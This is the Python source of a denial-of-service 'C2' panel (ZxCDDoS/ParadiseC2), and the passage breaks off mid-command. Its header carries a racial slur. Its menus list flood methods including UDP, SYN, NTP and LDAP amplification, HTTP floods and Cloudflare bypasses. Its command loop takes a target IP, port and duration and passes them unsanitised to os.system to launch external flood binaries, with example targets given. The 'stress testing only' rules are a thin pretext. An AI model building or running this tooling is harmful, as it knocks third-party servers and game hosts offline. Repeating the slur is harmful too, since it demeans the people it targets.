##############################
# ZxCDDoS Made by zxcr9999   #
# COPY = NIGGER              #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWELCOME TO PARADISEC2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')
    
def layer7():
    clear()
    si()
    print(f'''\x1b[0;38;2;0;255;128m    ┌──────────┬─────────────┬──────────────────────────────────┐
\x1b[0;38;2;0;248;135m    │\x1b[0m   Type   \x1b[0;38;2;0;248;135m│\x1b[0m   Methods   \x1b[0;38;2;0;248;135m│\x1b[0m            Description           \x1b[0;38;2;0;248;135m│
\x1b[0;38;2;0;241;142m    ├──────────┼─────────────┼──────────────────────────────────┤
\x1b[0;38;2;0;234;149m    │\x1b[0m  LAYER3  \x1b[0;38;2;0;234;149m│\x1b[0m * .icmp     \x1b[0;38;2;0;234;149m│\x1b[0m  I.C.M.P Flood                   \x1b[0;38;2;0;234;149m│
\x1b[0;38;2;0;227;156m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;227;156m│\x1b[0m * .udp      \x1b[0;38;2;0;227;156m│\x1b[0m  UDP Junk Flood                  \x1b[0;38;2;0;227;156m│
\x1b[0;38;2;0;220;163m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;220;163m│\x1b[0m * .tcp      \x1b[0;38;2;0;220;163m│\x1b[0m  TCP Junk Flood                  \x1b[0;38;2;0;220;163m│
\x1b[0;38;2;0;213;170m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;213;170m│\x1b[0m * .syn      \x1b[0;38;2;0;213;170m│\x1b[0m  SYNchromize Flood               \x1b[0;38;2;0;213;170m│
\x1b[0;38;2;0;206;177m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;206;177m│\x1b[0m * .tcpsyn   \x1b[0;38;2;0;206;177m│\x1b[0m  TCP/SYN Flood                   \x1b[0;38;2;0;206;177m│
\x1b[0;38;2;0;199;184m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;199;184m│\x1b[0m * .vse      \x1b[0;38;2;0;199;184m│\x1b[0m  Valve Source Engine Flood       \x1b[0;38;2;0;199;184m│
\x1b[0;38;2;0;192;191m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;192;191m│\x1b[0m * .std      \x1b[0;38;2;0;192;191m│\x1b[0m  Standard Internet Flood         \x1b[0;38;2;0;192;191m│
\x1b[0;38;2;0;185;198m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;185;198m│\x1b[0m * .hex      \x1b[0;38;2;0;185;198m│\x1b[0m  Specific HEXIDECIMAL Flood      \x1b[0;38;2;0;185;198m│
\x1b[0;38;2;0;178;205m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;178;205m│\x1b[0m * .cpukill  \x1b[0;38;2;0;178;205m│\x1b[0m  CPUKILL Attack (Ramps up CPU)   \x1b[0;38;2;0;178;205m│
\x1b[0;38;2;0;171;212m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;171;212m│\x1b[0m * .junk     \x1b[0;38;2;0;171;212m│\x1b[0m  JUNK Flood                      \x1b[0;38;2;0;171;212m│
\x1b[0;38;2;0;164;219m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;164;219m│\x1b[0m * .udpmix   \x1b[0;38;2;0;164;219m│\x1b[0m  UDPMIX of TCP and UDP           \x1b[0;38;2;0;164;219m│
\x1b[0;38;2;0;157;226m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;157;226m│\x1b[0m * .killall  \x1b[0;38;2;0;157;226m│\x1b[0m  KILLALL Flood                   \x1b[0;38;2;0;157;226m│
\x1b[0;38;2;0;150;233m    │\x1b[0m  LAYER7  \x1b[0;38;2;0;150;233m│\x1b[0m * .httpget  \x1b[0;38;2;0;150;233m│\x1b[0m  HTTP GET Flood                  \x1b[0;38;2;0;150;233m│
\x1b[0;38;2;0;143;240m    └──────────┴─────────────┴──────────────────────────────────┘
''')

def layer4():
    clear()
    si()
    print(f'''
                            \x1b[0;38;2;0;255;128m    ┌──────────┬─────────────┬──────────────────────────────────┐
\x1b[0;38;2;0;248;135m    │\x1b[0m   Type   \x1b[0;38;2;0;248;135m│\x1b[0m   Methods   \x1b[0;38;2;0;248;135m│\x1b[0m            Description           \x1b[0;38;2;0;248;135m│
\x1b[0;38;2;0;241;142m    ├──────────┼─────────────┼──────────────────────────────────┤
\x1b[0;38;2;0;234;149m    │\x1b[0m  LAYER3  \x1b[0;38;2;0;234;149m│\x1b[0m * .icmp     \x1b[0;38;2;0;234;149m│\x1b[0m  I.C.M.P Flood                   \x1b[0;38;2;0;234;149m│
\x1b[0;38;2;0;227;156m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;227;156m│\x1b[0m * .udp      \x1b[0;38;2;0;227;156m│\x1b[0m  UDP Junk Flood                  \x1b[0;38;2;0;227;156m│
\x1b[0;38;2;0;220;163m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;220;163m│\x1b[0m * .tcp      \x1b[0;38;2;0;220;163m│\x1b[0m  TCP Junk Flood                  \x1b[0;38;2;0;220;163m│
\x1b[0;38;2;0;213;170m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;213;170m│\x1b[0m * .syn      \x1b[0;38;2;0;213;170m│\x1b[0m  SYNchromize Flood               \x1b[0;38;2;0;213;170m│
\x1b[0;38;2;0;206;177m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;206;177m│\x1b[0m * .tcpsyn   \x1b[0;38;2;0;206;177m│\x1b[0m  TCP/SYN Flood                   \x1b[0;38;2;0;206;177m│
\x1b[0;38;2;0;199;184m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;199;184m│\x1b[0m * .vse      \x1b[0;38;2;0;199;184m│\x1b[0m  Valve Source Engine Flood       \x1b[0;38;2;0;199;184m│
\x1b[0;38;2;0;192;191m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;192;191m│\x1b[0m * .std      \x1b[0;38;2;0;192;191m│\x1b[0m  Standard Internet Flood         \x1b[0;38;2;0;192;191m│
\x1b[0;38;2;0;185;198m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;185;198m│\x1b[0m * .hex      \x1b[0;38;2;0;185;198m│\x1b[0m  Specific HEXIDECIMAL Flood      \x1b[0;38;2;0;185;198m│
\x1b[0;38;2;0;178;205m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;178;205m│\x1b[0m * .cpukill  \x1b[0;38;2;0;178;205m│\x1b[0m  CPUKILL Attack (Ramps up CPU)   \x1b[0;38;2;0;178;205m│
\x1b[0;38;2;0;171;212m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;171;212m│\x1b[0m * .junk     \x1b[0;38;2;0;171;212m│\x1b[0m  JUNK Flood                      \x1b[0;38;2;0;171;212m│
\x1b[0;38;2;0;164;219m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;164;219m│\x1b[0m * .udpmix   \x1b[0;38;2;0;164;219m│\x1b[0m  UDPMIX of TCP and UDP           \x1b[0;38;2;0;164;219m│
\x1b[0;38;2;0;157;226m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;157;226m│\x1b[0m * .killall  \x1b[0;38;2;0;157;226m│\x1b[0m  KILLALL Flood                   \x1b[0;38;2;0;157;226m│
\x1b[0;38;2;0;150;233m    │\x1b[0m  LAYER7  \x1b[0;38;2;0;150;233m│\x1b[0m * .httpget  \x1b[0;38;2;0;150;233m│\x1b[0m  HTTP GET Flood                  \x1b[0;38;2;0;150;233m│
\x1b[0;38;2;0;143;240m    └──────────┴─────────────┴──────────────────────────────────┘
''')

def amp_games():
    clear()
    si()
    print(f'''
                             \x1b[0;38;2;0;255;128m    ┌──────────┬─────────────┬──────────────────────────────────┐
\x1b[0;38;2;0;248;135m    │\x1b[0m   Type   \x1b[0;38;2;0;248;135m│\x1b[0m   Methods   \x1b[0;38;2;0;248;135m│\x1b[0m            Description           \x1b[0;38;2;0;248;135m│
\x1b[0;38;2;0;241;142m    ├──────────┼─────────────┼──────────────────────────────────┤
\x1b[0;38;2;0;234;149m    │\x1b[0m  LAYER3  \x1b[0;38;2;0;234;149m│\x1b[0m * .icmp     \x1b[0;38;2;0;234;149m│\x1b[0m  I.C.M.P Flood                   \x1b[0;38;2;0;234;149m│
\x1b[0;38;2;0;227;156m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;227;156m│\x1b[0m * .udp      \x1b[0;38;2;0;227;156m│\x1b[0m  UDP Junk Flood                  \x1b[0;38;2;0;227;156m│
\x1b[0;38;2;0;220;163m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;220;163m│\x1b[0m * .tcp      \x1b[0;38;2;0;220;163m│\x1b[0m  TCP Junk Flood                  \x1b[0;38;2;0;220;163m│
\x1b[0;38;2;0;213;170m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;213;170m│\x1b[0m * .syn      \x1b[0;38;2;0;213;170m│\x1b[0m  SYNchromize Flood               \x1b[0;38;2;0;213;170m│
\x1b[0;38;2;0;206;177m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;206;177m│\x1b[0m * .tcpsyn   \x1b[0;38;2;0;206;177m│\x1b[0m  TCP/SYN Flood                   \x1b[0;38;2;0;206;177m│
\x1b[0;38;2;0;199;184m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;199;184m│\x1b[0m * .vse      \x1b[0;38;2;0;199;184m│\x1b[0m  Valve Source Engine Flood       \x1b[0;38;2;0;199;184m│
\x1b[0;38;2;0;192;191m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;192;191m│\x1b[0m * .std      \x1b[0;38;2;0;192;191m│\x1b[0m  Standard Internet Flood         \x1b[0;38;2;0;192;191m│
\x1b[0;38;2;0;185;198m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;185;198m│\x1b[0m * .hex      \x1b[0;38;2;0;185;198m│\x1b[0m  Specific HEXIDECIMAL Flood      \x1b[0;38;2;0;185;198m│
\x1b[0;38;2;0;178;205m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;178;205m│\x1b[0m * .cpukill  \x1b[0;38;2;0;178;205m│\x1b[0m  CPUKILL Attack (Ramps up CPU)   \x1b[0;38;2;0;178;205m│
\x1b[0;38;2;0;171;212m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;171;212m│\x1b[0m * .junk     \x1b[0;38;2;0;171;212m│\x1b[0m  JUNK Flood                      \x1b[0;38;2;0;171;212m│
\x1b[0;38;2;0;164;219m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;164;219m│\x1b[0m * .udpmix   \x1b[0;38;2;0;164;219m│\x1b[0m  UDPMIX of TCP and UDP           \x1b[0;38;2;0;164;219m│
\x1b[0;38;2;0;157;226m    │\x1b[0m  LAYER4  \x1b[0;38;2;0;157;226m│\x1b[0m * .killall  \x1b[0;38;2;0;157;226m│\x1b[0m  KILLALL Flood                   \x1b[0;38;2;0;157;226m│
\x1b[0;38;2;0;150;233m    │\x1b[0m  LAYER7  \x1b[0;38;2;0;150;233m│\x1b[0m * .httpget  \x1b[0;38;2;0;150;233m│\x1b[0m  HTTP GET Flood                  \x1b[0;38;2;0;150;233m│
\x1b[0;38;2;0;143;240m    └──────────┴─────────────┴──────────────────────────────────┘
''')


def menu():
    sys.stdout.write(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to PARADISE C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    print("")
    print("""
                      \x1b[0;38;2;0;255;128m        ,------.                           ,--.,--.               
\x1b[0;38;2;0;255;128m    ┌─────────┬───────────────────────────────┐
\x1b[0;38;2;0;237;146m    │\x1b[0m HELP    \x1b[0;38;2;0;237;146m│\x1b[0m Shows list of commands        \x1b[0;38;2;0;237;146m│
\x1b[0;38;2;0;219;164m    │\x1b[0m HOW     \x1b[0;38;2;0;219;164m│\x1b[0m Shows usage of attacks        \x1b[0;38;2;0;219;164m│
\x1b[0;38;2;0;201;182m    │\x1b[0m METHODS \x1b[0;38;2;0;201;182m│\x1b[0m Shows list of attack methods  \x1b[0;38;2;0;201;182m│
\x1b[0;38;2;0;193;182m    │\x1b[0m ABOUT   \x1b[0;38;2;0;201;182m│\x1b[0m About ParadiseC2              \x1b[0;38;2;0;201;182m│
\x1b[0;38;2;0;183;200m    │\x1b[0m CLEAR   \x1b[0;38;2;0;183;200m│\x1b[0m Clears the screen             \x1b[0;38;2;0;183;200m│
\x1b[0;38;2;0;165;218m    │\x1b[0m LOGOUT  \x1b[0;38;2;0;165;218m│\x1b[0m Disconnects from the net      \x1b[0;38;2;0;165;218m│
\x1b[0;38;2;0;152;218m    │\x1b[0m EXIT    \x1b[0;38;2;0;165;218m│\x1b[0m Disconnects from the net      \x1b[0;38;2;0;165;218m│
\x1b[0;38;2;0;147;236m    └─────────┴───────────────────────────────┘
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@Z\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133mC\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
